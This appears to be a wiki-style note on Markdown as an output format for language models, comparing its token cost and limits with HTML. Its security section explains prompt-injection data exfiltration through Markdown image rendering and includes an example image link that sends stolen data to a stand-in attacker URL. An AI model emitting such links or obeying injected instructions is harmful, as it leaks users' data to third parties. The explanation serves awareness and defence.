# Markdown

The incumbent *text* artifact format for LLMs, and HTML's main rival. Token-cheap, human-readable, model-native — but flat and non-interactive.

## Why It Dominates

Models are trained on enormous Markdown corpora (GitHub, Stack Overflow, Reddit), so it's effectively native output, and it's token-efficient: `## Heading` is far cheaper than `<h2>Heading</h2>`. Cloudflare's "Markdown for Agents" (Feb 2026) institutionalized it — auto-converting pages to Markdown via HTTP content negotiation, reporting an **80% token reduction** (one page: 16,180 tokens as HTML vs 3,150 as Markdown), with an `x-markdown-tokens` header.

## Its Limits (the opening for HTML)

- No interactivity, no layout control, static tables only, no embedded charts or widgets.
- The "wall of text" problem: long Markdown plans "reliably go unread" — the core of [[Thariq Shihipar]]'s [[HTML Is the New Markdown|argument]].

## Its One Security Liability

Markdown's lone "active" feature — image rendering, `![alt](url)` — is the canonical data-exfiltration vector. An injected instruction makes a chatbot render `![x](https://attacker/?q=<stolen-data>)`, leaking data in the URL with no click required. This attack has been confirmed against ChatGPT, Microsoft Copilot, Gemini, GitLab Duo, Amazon Q, NotebookLM, and others. See [[The Lethal Trifecta]].

## The Verdict

Markdown remains the rational default when output is edited, versioned, re-read, or piped through more LLM calls, and for agent-to-agent handoffs. HTML wins for human-facing, interactive, finished deliverables. "Match the format to the lifecycle." See [[The Case Against HTML]].

## See Also
- [[HTML Is the New Markdown]] · [[Format Alternatives]] · [[The Lethal Trifecta]]
- [[HTML as the Universal LLM Artifact]]
